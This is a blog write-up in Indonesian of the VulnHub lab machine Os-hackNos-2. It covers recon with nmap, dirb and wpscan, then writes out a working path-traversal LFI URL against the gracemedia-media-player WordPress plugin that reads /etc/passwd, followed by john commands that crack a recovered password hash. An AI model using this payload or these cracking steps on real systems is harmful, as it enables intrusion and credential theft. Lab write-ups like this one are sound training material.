---
title: "[VulnHub] Os-hackNos-2 WriteUp"
date: 2019-04-18T21:24:30-04:00
categories:
  - blog
tags:
  - vulnhub
  - writeup
  - easy
---

##Information Gathering
###Nmap
`nmap -sV -sC -p- hacknos.vh -oN initial.nmap -v`
![nmap](/assets/images/Os-HackNos-2/1.jpg)
Dari hasil portscan diatas server cuma menjalankan SSH dan web server.
 
###Directory Scanning
`dirb http://hacknos.vh /usr/share/wordlists/common.txt`
![dirb](/assets/images/Os-HackNos-2/2.jpg)
Server menggunakan CMS Wordpress.
  
###WPscan
wpscan adalah salah satu tools yang sering digunakan untuk melakukan scanning di web yang menjalankan WordPress. Umumnya wpscan digunakan untuk mengetahui versi wordpress, tema, dan plugin yang terpasang.
`wpscan --url http://hacknos.vh/tsweb/`
![wpscan](/assets/images/Os-HackNos-2/3.jpg)

Ternyata web target menggunakan plugin grace-media-player, cari nama plugin + ‘vulnerability’ maka ketemu bug LFI [[exploit.db]](https://www.exploit-db.com/exploits/46537). 
>_**Local File Inclusion (LFI)** adalah kerentanan/vulnerability yang umum ditemukan pada aplikasi web. Kerentanan ini memungkinkan penyerang/attacker untuk menyertakan file lokal yang tersimpan di server agar dapat menjadi bagian dari proses eksekusi aplikasi._ [(harryadinanta.com)](https://harryadinanta.com/exploitasi/2014/08/08/Local-File-Inclusion)

##Attacking
Setelah mengetahui ada bug LFI di web diatas, coba buka link yang kemungkinan vulnerable.
`http://hacknos.vh/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd`
![lfi](/assets/images/Os-HackNos-2/4.jpg)

Dan kita mendapatkan informasi user dan group di server dan ada hash password user ‘flag’ dibawah :D

Langkah selanjutnya adalah password cracking menggunakan john. Pertama copy data hash user flag ke file txt.
`echo 'flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/' > flag_hash`
Lalu crack dengan john.
`john flag_hash /usr/share/wordlists/rockyou.txt`
>_**rockyou.txt** contains 14,341,564 unique passwords, used in 32,603,388 accounts. Kali Linux provides this dictionary file as part of its standard installation.. gampangnya rockyou.txt adalah file berisi password dengan kekuatan lemah._

Tunggu selesai lalu ~~siap dihidangkan~~ buka flag_hash menggunakan john.
`john --show flag_hash`
![flaghash](/assets/images/Os-HackNos-2/5.jpg)

